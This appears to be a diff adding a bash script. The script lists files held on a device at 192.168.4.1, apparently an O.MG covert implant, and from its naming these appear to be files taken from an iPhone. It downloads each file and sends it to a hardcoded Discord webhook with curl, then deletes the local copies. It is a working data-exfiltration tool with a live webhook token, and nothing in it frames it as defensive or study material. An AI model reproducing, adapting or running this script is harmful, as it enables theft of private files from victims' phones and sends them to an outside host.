@@ -1,0 +1,43 @@
+#!/bin/bash
+
+# Configuration
+DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1264594799516713112/-MxHrH9CMWvaBNwkVY2qRj7AnVKsCeKEABrjn9m1vFvHY58jbhMeNy6u_HjkZiVAktch"
+TEMP_DIR="/tmp/iphone_files"
+OMG_BASE_URL="http://192.168.4.1"
+LIST_FILES_ENDPOINT="/list_files"
+DOWNLOAD_FILE_ENDPOINT="/download_file"
+
+# Create a temporary directory to store downloaded files
+mkdir -p $TEMP_DIR
+
+# Function to send files to Discord
+upload_to_discord() {
+    local file_path="$1"
+    curl -F "file=@${file_path}" $DISCORD_WEBHOOK_URL
+}
+
+# Get the list of files
+files=$(curl -s "${OMG_BASE_URL}${LIST_FILES_ENDPOINT}")
+
+# Check if jq is installed
+if ! command -v jq &> /dev/null; then
+    echo "jq could not be found. Please install jq."
+    exit 1
+fi
+
+# Iterate through each file
+for file in $(echo $files | jq -r '.[] | .name'); do
+    # Download the file
+    curl -s -o "${TEMP_DIR}/${file}" "${OMG_BASE_URL}${DOWNLOAD_FILE_ENDPOINT}?file=${file}"
+
+    # Upload the file to Discord
+    upload_to_discord "${TEMP_DIR}/${file}"
+
+    # Clean up the downloaded file
+    rm "${TEMP_DIR}/${file}"
+done
+
+# Remove the temporary directory
+rmdir $TEMP_DIR
+
+echo "All files have been uploaded to Discord."
